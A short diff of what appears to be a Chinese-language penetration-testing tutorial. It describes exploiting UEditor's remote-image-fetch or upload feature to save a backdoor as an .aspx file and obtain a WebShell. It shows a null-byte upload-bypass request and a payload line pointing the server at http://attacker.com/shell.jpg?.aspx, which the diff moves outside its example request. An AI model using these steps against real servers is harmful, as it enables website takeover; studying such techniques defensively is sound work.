@@ -198,11 +198,12 @@ GET /upload/shell.jpg%20%00.php HTTP/1.1
 3.  **漏洞利用**：利用公开的EXP或手动构造请求，触发编辑器的“远程图片抓取”或“文件上传”功能，将包含后门代码的图片URL提交给服务器，并利用漏洞将其保存为可执行的脚本文件（如`.aspx`）。
 4.  **访问后门**：获取上传后的文件路径，直接访问即可获得WebShell。
 
+source[]=http://attacker.com/shell.jpg?.aspx
+
 ```http
 # 示例请求（具体参数因版本而异）
 POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1
 ...
-source[]=http://attacker.com/shell.jpg?.aspx
 ```
 
 ![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_113.png)
